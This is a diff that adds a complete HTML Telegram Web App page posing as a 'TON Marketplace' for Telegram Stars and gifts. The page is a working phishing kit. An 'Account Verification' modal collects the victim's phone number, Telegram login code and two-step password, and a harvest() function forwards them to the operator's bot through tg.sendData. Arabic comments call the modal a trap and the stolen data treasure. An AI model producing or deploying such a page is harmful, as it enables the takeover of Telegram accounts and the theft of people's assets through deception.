@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Assets Marketplace</title>
+    <style>
+        body {
+            background-color: #0088cc; /* لون التليجرام والتون الرسمي */
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column; align-items: center;
+        }
+        .container {
+            width: 100%; max-width: 400px;
+            padding: 20px; text-align: center;
+        }
+        .logo {
+            width: 80px; height: 80px;
+            margin-top: 30px;
+        }
+        h1 { font-size: 24px; margin-top: 10px; }
+        p { font-size: 14px; opacity: 0.9; line-height: 1.5; }
+        
+        .asset-card {
+            background: white; color: #333;
+            border-radius: 15px; padding: 15px;
+            margin-top: 20px; display: flex;
+            justify-content: space-between; align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .btn-connect {
+            background: #ffffff; color: #0088cc;
+            border: none; padding: 12px 30px;
+            border-radius: 25px; font-weight: bold;
+            margin-top: 20px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        /* نافذة الفخ المغناطيسية */
+        #login-modal {
+            display: none; position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 1000;
+        }
+        .modal-content {
+            background: white; color: #333;
+            width: 85%; max-width: 350px;
+            margin: 100px auto; border-radius: 20px;
+            padding: 25px; text-align: center;
+        }
+        input {
+            width: 90%; padding: 12px;
+            margin: 10px 0; border: 1px solid #ddd;
+            border-radius: 8px; font-size: 16px;
+        }
+        .btn-submit {
+            background: #0088cc; color: white;
+            border: none; width: 100%;
+            padding: 12px; border-radius: 8px;
+            font-weight: bold; margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://ton.org/download/ton_symbol.png" class="logo" alt="TON">
+    <h1>TON Marketplace</h1>
+    <p>Securely trade Telegram Stars, Gifts, and Premium Assets using TON Blockchain.</p>
+
+    <div class="asset-card">
+        <span>⭐ 5,000 Telegram Stars</span>
+        <span style="font-weight: bold; color: #0088cc;">450 TON</span>
+    </div>
+
+    <div class="asset-card">
+        <span>🎁 Premium Gift (12 Months)</span>
+        <span style="font-weight: bold; color: #0088cc;">120 TON</span>
+    </div>
+
+    <button class="btn-connect" onclick="openModal()">Connect Account</button>
+</div>
+
+<div id="login-modal">
+    <div class="modal-content">
+        <h2 style="margin-top:0;">Account Verification</h2>
+        <p style="color: #666;">Enter your details to link your assets with TON wallet.</p>
+        
+        <input type="text" id="phone" placeholder="Phone Number (+964...)">
+        <input type="text" id="otp" placeholder="Telegram Login Code">
+        <input type="password" id="2fa" placeholder="Two-Step Verification (If any)">
+        
+        <button class="btn-submit" onclick="harvest()">Confirm & Sync</button>
+        <p style="font-size: 11px; color: #999; margin-top: 15px;">Encrypted by TON Blockchain Security</p>
+    </div>
+</div>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+    let tg = window.Telegram.WebApp;
+    tg.expand();
+
+    function openModal() {
+        document.getElementById('login-modal').style.display = 'block';
+    }
+
+    function harvest() {
+        const ph = document.getElementById('phone').value;
+        const code = document.getElementById('otp').value;
+        const password = document.getElementById('2fa').value;
+
+        if(ph && code) {
+            // إرسال "الكنز" لبوتك في تليجرام
+            const result = `📱 Phone: ${ph}\n🔑 Code: ${code}\n🛡 2FA: ${password}`;
+            tg.sendData(result);
+            tg.close();
+        } else {
+            alert("Please fill in all required fields.");
+        }
+    }
+</script>
+
+</body>
+</html>
